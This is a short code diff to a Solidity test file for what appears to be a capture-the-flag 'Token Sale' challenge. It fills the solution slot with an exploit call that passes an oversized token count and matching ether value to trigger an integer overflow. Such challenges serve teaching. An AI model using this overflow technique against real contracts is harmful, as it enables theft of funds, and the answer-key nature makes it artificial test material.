@@ -18,7 +18,7 @@ contract TokenSaleTest is Test {
     // Use the instance of tokenSale and exploitContract
     function testIncrement() public {
         // Put your solution here
-
+        exploitContract.callBuy{value: 415992086870360064 }(115792089237316195423570985008687907853269984665640564039458);
         _checkSolved();
     }
 
